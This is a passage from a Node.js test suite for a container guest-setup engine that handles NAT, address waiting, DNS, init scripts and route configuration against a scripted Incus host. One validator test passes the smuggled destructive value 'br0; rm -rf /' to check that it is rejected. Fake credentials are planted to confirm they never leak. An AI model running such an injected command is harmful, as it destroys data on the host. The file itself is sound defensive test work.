// A-17.7: the post-launch and post-start guest setup (NAT, the address wait,
// DNS, the init script, the routes) as a durable `guest_setup` runner job
// queued by the create / start / restart job, with the routes as the
// backend-executed `configure_routes` step. What is proved here, and how:
//   * the pure layer (setup-logic): the kind registries agree, strict
//     parameter validation (a script REFERENCE, never its text; ordered
//     phases; validated services), the fixed NAT argv, the host-reachable
//     address pick, the guest scripts' markers, the phase table, and the
//     dashboard's create-status derived from records alone;
//   * the guest scripts under a REAL `sh` (a temp resolv.conf, a temp log
//     dir): the DNS write, the init wrapper recording the exit code and the
//     tail in the guest, the read-back a resumed job does, the kill after a
//     timeout;
//   * the input store: 0600 files next to the database, read by reference,
//     consumed once, swept when nobody consumed them;
//   * the callers' behaviour through the real store and executor
//     (node:sqlite, a scripted host + guest): the dashboard's create carrying
//     the plan → the setup follow-up bound to the launched guest → the routes
//     step (lib/guest-routes over a real schema and a fake render) → the
//     create-status answer at every stage; MCP's create waiting on the setup
//     record for the address; start / restart / reboot's fix-up follow-up;
//   * failure paths: no address, an init script that exits nonzero, one that
//     times out (killed, recorded), containment unavailable; the guest stays
//     Running and the record is partial and truthful; nothing a script
//     prints reaches a row, an event or an answer (a real echoed credential
//     through the real wrapper under `umask 022`: 0600 artifacts, no leak);
//   * interruption: a dead owner before the script (resumed, run once),
//     after the script (resumed, the recorded exit READ, never re-run;
//     nothing recorded → init_uncertain with the guest's lease HELD until an
//     operator establishes the writer stopped and acknowledges — every kind
//     refused or waiting meanwhile, the acknowledgement atomic), the
//     backend's boot sweep;
//   * safe retries: a retried setup never repeats an issued or completed
//     init and KEEPS its result (a failed init is still a failed setup), and
//     re-renders rather than duplicates routes;
//   * shared leases: renewed under a slow live sequence beyond the lease
//     period and fenced (a worker that loses the network or routes lease
//     issues no further mutation);
//   * the completion contract: pending or failed routes keep the setup
//     from `setup_complete`; a settled outcome lands on the setup and on
//     the lifecycle job it followed;
//   * unavailable runners, unresolved holds, and contention on the shared
//     network and route leases (waited for, taken over when dead, requeued).
// The REST routes and the MCP tool import the native database module; their
// caller-side wiring is ratcheted in immediate-repairs.test.js.

import test from 'node:test';
import assert from 'node:assert/strict';
import { DatabaseSync } from 'node:sqlite';
import { spawn, spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, existsSync, statSync, writeFileSync, symlinkSync, utimesSync, rmSync, rmdirSync, accessSync, readdirSync, constants as FS } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  SETUP_JOB_KINDS, BACKEND_STEP_KINDS, SETUP_PHASES, FIXUP_PHASES, HOST_NETWORK_LOCK, HOST_ROUTES_LOCK, validateSetupParams, validateRoutesParams, normalizeServices,
  ipForwardArgv, networkListArgv, bridgeNatArgv, dockerUserCheckArgv, dockerUserInsertArgv, masqueradeCheckArgv, masqueradeAppendArgv, managedBridges,
  hostReachableIpv4, dnsScript, parseDns, initScriptWrapper, initResultReadScript, initKillScript, parseInitResult, parseInitKill, parseInitKillReport, phaseTable, setupOutcome, createStatusView, initWarning,
} from '../lib/setup-engine/setup-logic.js';
import { setupInputsDir, writeInitScriptInput, readInitScriptInput, consumeInitScriptInput, sweepSetupInputs, sha256Of } from '../lib/setup-engine/setup-inputs.js';
import { ownerIdentity, parseJson, validateRunnerJob, reconcileDecision, RUNNER_JOB_KINDS, MUTATING_JOB_KINDS, EXCLUSIVE_JOB_KINDS, BACKEND_JOB_KINDS, SETUP_JOB_KINDS as SETUP_KINDS_FROM_LOGIC } from '../lib/setup-engine/logic.js';
import { validateLifecycleParams, setupFollowUpFor } from '../lib/setup-engine/lifecycle-logic.js';
import { ensureSetupEngineSchema, getJob, listEvents, readLock, acquireLock, createJob, claimNextJob, checkpoint, runnerHeartbeat, listJobs, holdStaleLock, recordJobOutcome, releaseLock, renewLock } from '../lib/setup-engine/store.js';
import { runOnce, reconcile } from '../lib/setup-engine/executor.js';
import { runBackendSteps } from '../lib/setup-engine/backend-steps.js';
import { submitRunnerJob } from '../lib/setup-engine/orchestrator.js';
import { sweepSetupEngineOnBoot } from '../lib/setup-engine/backend.js';
import { runGuestSetupOperation } from '../lib/setup-engine/setup-op.js';
import { configureGuestRoutes, findOrCreateLxcService, syncServiceUpstream } from '../lib/guest-routes.js';
import { configureContainerLockStore, containerLockStore } from '../mock2/container-lock.js';
import { runLifecycle, runGuestSetup, createStatus, waitForSetup, drainBackendStepsNow, lifecycleHttpStatus, resolveSetupPlan } from '../mock2/ops.js';
import { jobView, takeoverLock } from '../lib/setup-engine/store.js';
import { unwrapContained, jobIdOf } from './helpers/scripted-guest.js';
import { acknowledgeUncertainJob } from '../lib/setup-engine/backend.js';
import { LeaseLostError, settleSetupRecord } from '../lib/setup-engine/backend-steps.js';
import { containedScript, parseContainment, CONTAINMENT_RUN_DIR } from '../lib/setup-engine/guest-probes.js';
import { renderDomains } from '../lib/route-render.js';

const T0 = Date.parse('2026-09-23T12:00:00.000Z');
const RUNNER = ownerIdentity({ kind: 'runner', host: 'pp', pid: 300, instance: 'rrrr' });
const BACKEND = ownerIdentity({ kind: 'backend', host: 'pp', pid: 100, instance: 'aaaa' });
const DEAD = ownerIdentity({ kind: 'runner', host: 'pp', pid: 999, instance: 'dead' });
const DEAD_BACKEND = ownerIdentity({ kind: 'backend', host: 'pp', pid: 998, instance: 'gone' });
const OTHER = ownerIdentity({ kind: 'runner', host: 'pp', pid: 301, instance: 'oooo' });
const UUID_A = '11111111-2222-3333-4444-555555555555';
const UUID_B = '99999999-8888-7777-6666-555555555555';
const SHA = 'a'.repeat(64);
const SCRIPT = '#!/bin/sh\napt-get install -y nginx\nexport API_TOKEN=tok-9f8e7d6c5b4a-secret\necho done\n';
// A script that PRINTS a synthetic credential (what a real init script may
// do); its output must reach the guest's log and nothing else.
const CRED = 'AKIA-synthetic-cred-7Q2Z9X4M1L8N';
const ECHO_SCRIPT = `#!/bin/sh\necho "installing"\necho "generated token: ${CRED}"\necho "PASSWORD=${CRED}-pw" >&2\nexit 5\n`;
const SERVICES = [{ domain: 'app.example.test', port: 3000, obtainCert: true }, { domain: 'api.example.test', port: 8080, obtainCert: false, healthPath: '/healthz' }];

function db() { const d = new DatabaseSync(':memory:'); ensureSetupEngineSchema(d); return d; }
function tmp() { return mkdtempSync(join(tmpdir(), 'pp-setup-')); }
const net = (ip, extra = {}) => ({ eth0: { addresses: [{ family: 'inet', address: ip, scope: 'global', netmask: '24' }, { family: 'inet6', address: 'fe80::1', scope: 'link' }] }, lo: { addresses: [{ family: 'inet', address: '127.0.0.1', scope: 'local' }] }, ...extra });
const inst = (over = {}) => ({ name: 'pp-x', status: 'Running', created_at: '2026-09-01T10:00:00Z', config: { 'volatile.uuid': UUID_A }, snapshots: [], expanded_devices: { root: { type: 'disk', path: '/', pool: 'default' }, eth0: { type: 'nic', network: 'incusbr0' } }, state: { network: net('10.10.10.5') }, ...over });

// The scripted host: incus / sysctl / iptables as argv arrays over a state.
//   state.instances      the guests; a guest gains its address when
//                        state.lists >= (state.addressAfter ?? 0)
//   state.bridges        what `incus network list` reports
//   state.rules          the iptables rules present ('DOCKER-USER -i incusbr0', 'MASQ')
//   state.dockerChain    false → iptables DOCKER-USER commands fail (no Docker)
//   state.launchFails    the launch fails
function scriptedHost(state) {
  const calls = [];
  state.rules = state.rules || new Set();
  state.lists = 0;
  const byName = (n) => state.instances.find((i) => i.name === n) || null;
  const withAddress = (i) => (state.lists >= (state.addressAfter ?? 0) && !state.noAddress ? i : { ...i, state: { network: { lo: i.state?.network?.lo || { addresses: [] }, ...(state.dockerOnly ? { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] } } : {}) } } });
  return {
    calls,
    host: async (argv) => {
      calls.push(argv);
      assert.ok(Array.isArray(argv) && argv.every((a) => typeof a === 'string'), 'argv arrays only');
      if (state.onCall) await state.onCall(argv, calls.length);
      const [bin, ...a] = argv;
      if (bin === 'sysctl') { state.ipForward = a.includes('net.ipv4.ip_forward=1'); return state.sysctlFails ? { code: 255, stdout: '', stderr: 'sysctl: permission denied' } : { code: 0, stdout: 'net.ipv4.ip_forward = 1\n', stderr: '' }; }
      if (bin === 'iptables') {
        const t = a.join(' ');
        if (/DOCKER-USER/.test(t) && state.dockerChain === false) return { code: 2, stdout: '', stderr: "iptables: No chain/target/match by that name." };
        const key = /-t nat/.test(t) ? 'MASQ' : t.replace(/^-[CI] DOCKER-USER /, 'DOCKER-USER ').replace(/ -j ACCEPT$/, '');
        if (a[0] === '-C' || a[2] === '-C') return state.rules.has(key) ? { code: 0, stdout: '', stderr: '' } : { code: 1, stdout: '', stderr: 'iptables: Bad rule (does a matching rule exist in that chain?).' };
        state.rules.add(key); return { code: 0, stdout: '', stderr: '' };
      }
      if (bin !== 'incus') return { code: 127, stdout: '', stderr: `not found: ${bin}` };
      if (a[0] === 'network' && a[1] === 'list') return { code: 0, stdout: JSON.stringify(state.bridges ?? [{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'eth0', type: 'physical', managed: false }]), stderr: '' };
      if (a[0] === 'network' && a[1] === 'set') { state.natSet = [...(state.natSet || []), a[2]]; return state.natFails ? { code: 1, stdout: '', stderr: 'Error: Network not found' } : { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'list') { state.lists += 1; const i = byName(a[1]); return { code: 0, stdout: JSON.stringify(i ? [withAddress(i)] : []), stderr: '' }; }
      if (a[0] === 'start') { const i = byName(a[1]); if (!i) return { code: 1, stdout: '', stderr: 'Error: Instance not found' }; i.status = 'Running'; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'restart') { const i = byName(a[1]); if (!i) return { code: 1, stdout: '', stderr: 'Error: Instance not found' }; i.status = 'Running'; state.restarts = (state.restarts || 0) + 1; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'stop') { const i = byName(a[1]); if (i) i.status = 'Stopped'; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'delete') { state.instances = state.instances.filter((x) => x.name !== a[1]); state.deletes = (state.deletes || 0) + 1; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'launch') {
        const name = a[2];
        if (byName(name)) return { code: 1, stdout: '', stderr: `Error: Instance "${name}" already exists` };
        if (state.launchFails) return { code: 1, stdout: '', stderr: 'Error: Failed instance creation: image not found' };
        state.launches = (state.launches || 0) + 1;
        state.instances.push(inst({ name, created_at: '2026-09-23T12:00:05Z', config: { 'volatile.uuid': UUID_B }, state: { network: net('10.10.10.7') } }));
        return { code: 0, stdout: '', stderr: '' };
      }
      if (a[0] === 'config') return { code: 0, stdout: '', stderr: '' };
      return { code: 1, stdout: '', stderr: `unexpected ${argv.join(' ')}` };
    },
  };
}

// The scripted guest: the DNS script, the init wrapper, the read-back and the
// kill, answered from state. Records every init script body it was handed.
//   state.initRc          the exit code the wrapper reports (default 0)
//   state.initTimesOut    the wrapper "hangs": the executor's timeout (124)
//   state.guestRc         what a RESUMED read finds in the .rc file (null → none)
//   state.guestRunning    a pid the read reports as still running
//   state.containment     'none' → every contained script refuses (97)
//   state.dnsFails        the resolv.conf write fails
function scriptedGuest(state) {
  const calls = [];
  state.initScripts = [];
  return {
    calls,
    guest: async (container, raw, opts = {}) => {
      const s = unwrapContained(raw);
      // The job id: the containment marker, or — for the one script issued
      // outside containment, the kill — the ID the script itself carries.
      const id = s !== raw ? jobIdOf(raw) : (raw.match(/\bID='([A-Za-z0-9-]+)'/) || [])[1] || 'adhoc';
      const rec = (phase) => calls.push({ container, phase, script: s, raw, contained: s !== raw });
      if (state.containment === 'none' && /CONTAINMENT:none/.test(raw)) { rec('refused'); return { code: 97, stdout: '', stderr: 'CONTAINMENT:none\n' }; }
      // state.realContained: every script runs AS ISSUED — the production
      // containment wrapper over the real cgroup tree and run dir, the init
      // artifacts in the real /var/log and /tmp — under a real sh with the
      // executor's timeout enforced (the client is killed at the bound, as
      // incus exec's would be: exit 124). state.beforeKill(id) runs between
      // the timed-out init and the kill script.
      if (state.realContained && (/PP_INIT_/.test(s) || /PP_INIT_/.test(raw))) {
        if (/PP_INIT_KILL/.test(s)) { rec('init_kill'); state.killed = (state.killed || 0) + 1; if (state.beforeKill) { try { await state.beforeKill(id); } catch (e) { state.hookError = e; } } }
        else if (/PP_INIT_RC:none/.test(s)) rec('init_read');
        else { rec('init'); const m = s.match(/printf '%s' '([A-Za-z0-9+/=]+)' \| base64 -d > "\$S"/); state.initScripts.push(m ? Buffer.from(m[1], 'base64').toString('utf8') : null); }
        const r = spawnSync('sh', ['-c', 'umask 022; exec sh -s'], { input: raw, encoding: 'utf8', timeout: Number(opts.timeoutMs) || 20_000, killSignal: 'SIGKILL' });
        if (r.error && r.error.code === 'ETIMEDOUT') return { code: 124, stdout: r.stdout || '', stderr: `${r.stderr || ''}\n[timeout after ${opts.timeoutMs}ms]` };
        return { code: r.status, stdout: r.stdout || '', stderr: r.stderr || '' };
      }
      if (/PP_DNS:/.test(s)) { rec('dns'); if (state.dnsFails) return { code: 1, stdout: 'PP_DNS:failed\n', stderr: '' }; state.dnsWrites = (state.dnsWrites || 0) + 1; return { code: 0, stdout: state.dnsPresent ? 'PP_DNS:unchanged\n' : 'PP_DNS:written\n', stderr: '' }; }
      // state.realShell = <dir>: the init wrapper, the read-back and the kill
      // script run under a REAL sh with /var/log and /tmp redirected to <dir>
      // and the guest's umask at 022 — the generated shell under its interpreter.
      const real = (script) => { const rw = script.split("'/var/log").join('@L@').split("'/tmp").join('@T@').split('@L@').join(`'${state.realShell}`).split('@T@').join(`'${state.realShell}`); const r = spawnSync('sh', ['-c', 'umask 022; exec sh -s'], { input: rw, encoding: 'utf8', timeout: 20_000 }); return { code: r.status, stdout: r.stdout || '', stderr: r.stderr || '' }; };
      if (/PP_INIT_KILL/.test(s)) { rec('init_kill'); state.killed = (state.killed || 0) + 1; if (state.realShell) return real(s); return { code: 0, stdout: `PP_INIT_GROUPS:${state.killResult === 'norecord' ? 0 : 1}\nPP_INIT_KILL:${state.killResult || 'gone'}\n`, stderr: '' }; }
      if (/PP_INIT_RC:none/.test(s)) { rec('init_read'); if (state.realShell) return real(s); return { code: 0, stdout: state.guestRc == null ? `PP_INIT_RC:none\n${state.guestRunning ? `PP_INIT_RUNNING:${state.guestRunning}\n` : state.guestDead ? `PP_INIT_DEAD:${state.guestDead}\n` : 'PP_INIT_NOPID\n'}PP_INIT_LOG:/var/log/pp-init-${id}.log\nPP_INIT_LOG_BYTES:17\n` : `PP_INIT_RC:${state.guestRc}\nPP_INIT_LOG:/var/log/pp-init-${id}.log\nPP_INIT_LOG_BYTES:33\n`, stderr: '' }; }
      if (/PP_INIT_RC:\$rc/.test(s)) {
        rec('init');
        const m = s.match(/printf '%s' '([A-Za-z0-9+/=]+)' \| base64 -d > "\$S"/);
        state.initScripts.push(m ? Buffer.from(m[1], 'base64').toString('utf8') : null);
        if (state.realShell) return real(s);
        if (state.initTimesOut) return { code: 124, stdout: '', stderr: '\n[timeout after 305000ms]' };
        const rc = state.initRc ?? 0;
        return { code: 0, stdout: `PP_INIT_RC:${rc}\nPP_INIT_LOG:/var/log/pp-init-${id}.log\nPP_INIT_LOG_BYTES:${rc ? 61 : 5}\n`, stderr: '' };
      }
      rec('other'); return { code: 1, stdout: '', stderr: `unexpected: ${s.slice(0, 60)}` };
    },
  };
}

const exec = (h, g) => ({ guest: g.guest, host: h.host });
function clock(start = T0) { const c = { t: start }; c.nowMs = () => c.t; c.sleep = async (ms) => { c.t += ms; }; c.tick = (ms) => { c.t += ms; }; return c; }
const runAll = (d, ex, c, opts = {}) => runOnce({ db: d, owner: RUNNER, exec: ex, reviewLogin: async () => null, nowMs: c.nowMs, sleep: c.sleep, inputsDir: opts.inputsDir || null, log: () => {} }, { reconcileFirst: false, ...opts });
const mutations = (h) => h.calls.filter((a) => !(a[0] === 'incus' && (a[1] === 'list' || (a[1] === 'network' && a[2] === 'list'))));
const phasesOf = (d, id) => (parseJson(getJob(d, id).progress_json) || {}).phases || {};
const setupOf = (d, createId) => { const p = parseJson(getJob(d, createId).progress_json) || {}; return p.setup_job_id ? getJob(d, p.setup_job_id) : null; };
const noScriptIn = (d, ids) => { for (const id of ids) { const dump = JSON.stringify(getJob(d, id)) + JSON.stringify(listEvents(d, id)); assert.equal(dump.includes('tok-9f8e7d6c5b4a'), false, `the init script's token leaked into job ${id}`); assert.equal(dump.includes('apt-get install'), false, `the init script's text leaked into job ${id}`); assert.equal(dump.includes(CRED), false, `the script's printed credential leaked into job ${id}`); assert.equal(/installing|generated token/.test(dump), false, `the script's output leaked into job ${id}`); } };
const holdOn = (d, app, jobId) => { const l = readLock(d, app); assert.ok(l && l.stale_since && l.recovery_job_id === jobId, `${app} is held by job ${jobId}: ${JSON.stringify(l)}`); return l; };

// A store for the ops layer over a scripted host + guest, an input dir and a
// route configurator that records what it was asked for.
//   renderDeps   a Caddy render bundle: the store then has NO configureRoutes
//                of its own and the backend step runs the PRODUCTION adapter
//                (ops.js backendStepDeps → lib/guest-routes.js → lib/route-render.js)
//                over the real tables, with only Caddy replaced.
function opsStore(d, h, g, { policy = 'backend-allowed', inputsDir = null, routes = null, renderDeps = null } = {}) {
  const asked = [];
  configureContainerLockStore({
    getDb: () => d, owner: BACKEND, env: { SETUP_EXECUTOR_POLICY: policy }, guestExec: exec(h, g), hostExec: h.host, reviewLogin: async () => null, inputsDir,
    configureRoutes: renderDeps ? null : (routes || (async (args) => { asked.push(args); return { created: args.services.map((s) => s.domain), existing: [], conflicts: [], rendered: args.services.map((s) => s.domain), renderWarning: null, upstreamWarning: null }; })),
    renderDeps,
  });
  return { asked };
}

// The dashboard's create: the launch plan with the whole setup, submitted
// detached and kicked (what POST /containers does); returns the create row.
async function dashboardCreate(d, h, g, { inputsDir, script = SCRIPT, services = SERVICES, name = 'pp-new' } = {}) {
  const setup = { phases: ['network_nat', 'await_address', 'dns'], addressTimeoutMs: 30_000 };
  if (script) { setup.initScript = writeInitScriptInput(inputsDir, script); setup.phases.push('init_script'); }
  if (services) { setup.phases.push('routes'); setup.services = services; setup.serviceName = name.replace(/^pp-/, ''); }
  const out = await runLifecycle({ kind: 'instance_create', containerName: name, image: 'images:debian/12', profile: 'default', config: { 'limits.cpu': '2' }, setup, via: 'ui', requestedBy: 'thomas', detach: true, awaitKick: true });
  return { out, setup };
}

// ── 1. the pure layer ─────────────────────────────────────────────────────

test('registry: guest_setup is a runner, mutating and exclusive kind (the two modules agree); configure_routes is the backend\'s; the phases are fixed and ordered', () => {
  assert.deepEqual([...SETUP_JOB_KINDS], ['guest_setup']); assert.deepEqual([...SETUP_KINDS_FROM_LOGIC], [...SETUP_JOB_KINDS], 'logic.js spells the list out (import cycle); it must match');
  assert.ok(RUNNER_JOB_KINDS.includes('guest_setup')); assert.ok(MUTATING_JOB_KINDS.includes('guest_setup')); assert.ok(EXCLUSIVE_JOB_KINDS.includes('guest_setup'));
  assert.deepEqual([...BACKEND_STEP_KINDS], ['configure_pomerium_routes', 'configure_routes', 'configure_keycloak_route', 'verify_sso', 'configure_recovery_route']); assert.ok(BACKEND_JOB_KINDS.includes('configure_routes')); assert.ok(!RUNNER_JOB_KINDS.includes('configure_routes'), 'the runner never claims a backend step');
  assert.ok(MUTATING_JOB_KINDS.includes('configure_routes'), 'a lifecycle verb is refused while the routes are being configured');
  assert.deepEqual([...SETUP_PHASES], ['network_nat', 'await_address', 'dns', 'init_script', 'routes']); assert.deepEqual([...FIXUP_PHASES], ['network_nat', 'dns']);
  assert.equal(HOST_NETWORK_LOCK, '@host/network'); assert.equal(HOST_ROUTES_LOCK, '@host/routes');
  assert.ok(!/^[a-zA-Z0-9]/.test(HOST_NETWORK_LOCK), 'a host lease name can never be a guest name');
});

test('validation is strict: a script REFERENCE (ref, sha256, bytes) and never its text; phases in order; services validated; nothing that looks like a command or a secret', () => {
  const ok = (p) => assert.deepEqual(validateSetupParams(p), { ok: true }, JSON.stringify(p));
  const bad = (p, re) => assert.match(validateSetupParams(p).reason, re, JSON.stringify(p));
  ok({ container: 'pp-x', phases: ['network_nat', 'dns'] });
  ok({ container: 'pp-x', phases: ['network_nat', 'await_address', 'dns', 'init_script', 'routes'], expect: { uuid: UUID_A, created_at: '2026-09-01T10:00:00Z' }, initScript: { ref: 'r-1', sha256: SHA, bytes: 42 }, services: SERVICES, serviceName: 'x', addressTimeoutMs: 15000, initTimeoutMs: 60000, resolvers: ['9.9.9.9'], origin: { jobId: 'j-1', kind: 'instance_create' } });
  bad({ container: 'pp-x', phases: ['dns', 'network_nat'] }, /fixed order/);
  bad({ container: 'pp-x', phases: ['reboot'] }, /not a setup phase/);
  bad({ container: 'pp-x', phases: [] }, /at least one/);
  bad({ container: 'pp-x', phases: ['init_script'] }, /needs initScript/);
  bad({ container: 'pp-x', phases: ['init_script'], initScript: { ref: 'r', sha256: 'abc', bytes: 1 } }, /hex digest/);
  bad({ container: 'pp-x', phases: ['init_script'], initScript: { ref: 'r', sha256: SHA, bytes: 1, text: '#!/bin/sh' } }, /not a script reference field/);
  bad({ container: 'pp-x', phases: ['dns'], initScriptText: '#!/bin/sh' }, /never carries a command/);
  bad({ container: 'pp-x', phases: ['dns'], command: 'sh /tmp/x' }, /never carries a command/);
  bad({ container: 'pp-x', phases: ['dns'], initScript: { ref: 'r', sha256: SHA, bytes: 1 } }, /init_script phase only/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'not a domain', port: 80 }], serviceName: 'x' }, /not a domain name/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 70000 }], serviceName: 'x' }, /port must be/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 80, healthPath: 'health' }], serviceName: 'x' }, /healthPath must start with/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 80 }, { domain: 'A.example.test', port: 81 }], serviceName: 'x' }, /listed twice/);
  bad({ container: 'pp-x', phases: ['routes'], services: SERVICES }, /serviceName/);
  bad({ container: 'pp-x', phases: ['dns'], addressTimeoutMs: 10 }, /addressTimeoutMs/);
  bad({ container: 'pp-x', phases: ['dns'], resolvers: ['dns.example'] }, /IPv4/);
  bad({ container: 'pp-x', phases: ['dns'], expect: { name: 'pp-x' } }, /not an identity field/);
  bad({ container: 'pp-x', phases: ['dns'], password: 'hunter2' }, /looks like a secret/);
  assert.match(validateRoutesParams({ container: 'pp-x', serviceName: 'x', ip: '10.0.0.300', services: SERVICES }).reason, /IPv4/);
  assert.deepEqual(validateRoutesParams({ container: 'pp-x', serviceName: 'x', ip: '10.10.10.5', services: SERVICES }), { ok: true });
  assert.deepEqual(normalizeServices([{ domain: ' App.Example.Test ', port: '3000' }, { domain: '', port: 1 }]), { services: [{ domain: 'app.example.test', port: 3000, obtainCert: true }] });
  assert.match(normalizeServices([{ domain: 'x', port: 1 }]).error, /not a domain name/);
  // Through validateRunnerJob, as the runner validates a claimed row.
  assert.deepEqual(validateRunnerJob({ kind: 'guest_setup', app: 'pp-x', plan: { steps: [], params: { container: 'pp-x', phases: ['dns'] } } }), { ok: true });
  assert.match(validateRunnerJob({ kind: 'guest_setup', app: 'pp-x', plan: { steps: [], params: { container: 'pp-x', phases: ['dns'], argv: ['sh'] } } }).reason, /never carries a command/);
  // A create carries the plan without an identity; a start carries the fix-up flag; nothing else does.
  assert.deepEqual(validateLifecycleParams('instance_create', { container: 'pp-n', image: 'images:debian/12', setup: { phases: ['network_nat', 'dns'] } }), { ok: true });
  assert.match(validateLifecycleParams('instance_create', { container: 'pp-n', image: 'images:debian/12', setup: { phases: ['dns'], expect: { uuid: UUID_A } } }).reason, /binds its identity from the launched guest/);
  assert.match(validateLifecycleParams('instance_start', { container: 'pp-x', setup: { phases: ['dns'] } }).reason, /carries no setup plan/);
  assert.deepEqual(validateLifecycleParams('instance_start', { container: 'pp-x', fixup: true }), { ok: true });
  assert.match(validateLifecycleParams('instance_stop', { container: 'pp-x', fixup: true }).reason, /fixup applies to start and restart/);
  assert.deepEqual(setupFollowUpFor('instance_create', { container: 'pp-n', setup: { phases: ['dns', 'network_nat'], addressTimeoutMs: 5000 } }, { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z', status: 'Running' }), { kind: 'guest_setup', params: { phases: ['network_nat', 'dns'], addressTimeoutMs: 5000, container: 'pp-n', expect: { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z' } } });
  assert.equal(setupFollowUpFor('instance_start', { container: 'pp-x' }, null), null);
});

test('the NAT phase renders fixed argv; a bridge name the host reports is validated before it becomes an argument; the address pick is host-reachable only', () => {
  assert.deepEqual(ipForwardArgv(), ['sysctl', '-w', 'net.ipv4.ip_forward=1']);
  assert.deepEqual(networkListArgv(), ['incus', 'network', 'list', '--format', 'json']);
  assert.deepEqual(bridgeNatArgv('incusbr0'), ['incus', 'network', 'set', 'incusbr0', 'ipv4.nat', 'true']);
  assert.deepEqual(dockerUserCheckArgv('m2br7', 'in'), ['iptables', '-C', 'DOCKER-USER', '-i', 'm2br7', '-j', 'ACCEPT']);
  assert.deepEqual(dockerUserInsertArgv('m2br7', 'out'), ['iptables', '-I', 'DOCKER-USER', '-o', 'm2br7', '-j', 'ACCEPT']);
  assert.deepEqual(masqueradeCheckArgv(), ['iptables', '-t', 'nat', '-C', 'POSTROUTING', '-s', '10.0.0.0/8', '!', '-d', '10.0.0.0/8', '-j', 'MASQUERADE']);
  assert.deepEqual(masqueradeAppendArgv().slice(0, 5), ['iptables', '-t', 'nat', '-A', 'POSTROUTING']);
  assert.throws(() => bridgeNatArgv('br0; rm -rf /'), /not a bridge name/);
  assert.deepEqual(managedBridges(JSON.stringify([{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'ext', type: 'bridge', managed: false }, { name: 'bad name', type: 'bridge', managed: true }, { name: 'eth0', type: 'physical', managed: false }])), { bridges: ['incusbr0'], rejected: ['bad name'] });
  assert.match(managedBridges('nope').error, /not JSON/);
  assert.deepEqual(hostReachableIpv4(inst()), { address: '10.10.10.5', interface: 'eth0' });
  assert.deepEqual(hostReachableIpv4(inst({ state: { network: { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] }, eth0: { addresses: [{ family: 'inet', address: '10.10.10.9', scope: 'global' }] } } } })), { address: '10.10.10.9', interface: 'eth0' }, 'eth0 first');
  assert.equal(hostReachableIpv4(inst({ state: { network: { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] }, 'br-abc123': { addresses: [{ family: 'inet', address: '172.18.0.1', scope: 'global' }] } } } })), null, 'a runtime\'s own bridge inside the guest is never the address');
  assert.deepEqual(hostReachableIpv4(inst({ state: { network: { enp5s0: { addresses: [{ family: 'inet', address: '10.20.0.4', scope: 'global' }] } } }, expanded_devices: { eth0: { type: 'nic', name: 'enp5s0', network: 'incusbr0' } } })), { address: '10.20.0.4', interface: 'enp5s0' }, 'the NIC device by its in-guest name');
  assert.equal(hostReachableIpv4(inst({ state: { network: { eth0: { addresses: [{ family: 'inet', address: '169.254.1.1', scope: 'link' }] } } } })), null);
  assert.equal(hostReachableIpv4({}), null);
});

test('scripts, markers and the record\'s reading: parseDns, parseInitResult, the phase table, the outcome and the create-status view', () => {
  assert.equal(parseDns('PP_DNS:written\n'), 'written'); assert.equal(parseDns('nothing'), null);
  // Markers only: whatever else the guest printed is dropped, never a "tail".
  const parsed = parseInitResult(`PP_INIT_RC:3\ngenerated token: ${CRED}\nPP_INIT_LOG:/var/log/pp-init-j.log\nPP_INIT_LOG_BYTES:40\n`);
  assert.deepEqual(parsed, { rc: 3, recorded: true, running: null, dead: null, noPid: false, log: '/var/log/pp-init-j.log', logBytes: 40, writeFailed: false });
  assert.equal(JSON.stringify(parsed).includes(CRED), false);
  assert.deepEqual([parseInitResult('PP_INIT_RC:none\nPP_INIT_RUNNING:4242\n').running, parseInitResult('PP_INIT_RC:none\nPP_INIT_DEAD:4242\n').dead, parseInitResult('PP_INIT_RC:none\nPP_INIT_NOPID\n').noPid], [4242, 4242, true]);
  assert.equal(parseInitResult('PP_INIT_WRITE_FAILED\n').writeFailed, true);
  assert.equal(parseInitKill('PP_INIT_KILL:gone'), 'gone'); assert.equal(parseInitKill('PP_INIT_KILL:nopid'), null, 'the pid-only verdict is gone');
  assert.deepEqual(parseInitKillReport('PP_INIT_GROUPS:2\nPP_INIT_KILL:alive 3\n'), { verdict: 'alive', survivors: 3, groups: 2 }); assert.deepEqual(parseInitKillReport('PP_INIT_GROUPS:0\nPP_INIT_KILL:norecord\n'), { verdict: 'norecord', survivors: null, groups: 0 }); assert.deepEqual(parseInitKillReport('PP_INIT_GROUPS:1\nPP_INIT_KILL:gone\n').survivors, 0);
  assert.deepEqual(phaseTable(['network_nat', 'dns'], { network_nat: { state: 'done' } }), { network_nat: { state: 'done' }, dns: { state: 'not_run' } });
  // The completion contract.
  assert.deepEqual(setupOutcome({ network_nat: { state: 'done' }, routes: { state: 'pending' } }), { status: 'succeeded', outcome: 'setup_pending', completion: 'pending', failed: [], pending: ['routes'] }, 'a required phase with another job is never "complete"');
  assert.deepEqual(setupOutcome({ network_nat: { state: 'done' }, routes: { state: 'done' } }), { status: 'succeeded', outcome: 'setup_complete', completion: 'complete', failed: [], pending: [] });
  assert.deepEqual(setupOutcome({ network_nat: { state: 'done' }, init_script: { state: 'failed', rc: 2 }, routes: { state: 'not_run' } }), { status: 'failed', outcome: 'setup_partial', completion: 'partial', failed: ['init_script', 'routes'], pending: [] });
  assert.deepEqual(setupOutcome({ init_script: { state: 'done' }, routes: { state: 'failed' } }).completion, 'partial', 'a failed routes step is a partial setup');
  assert.equal(setupOutcome({ init_script: { state: 'uncertain' } }).completion, 'uncertain');
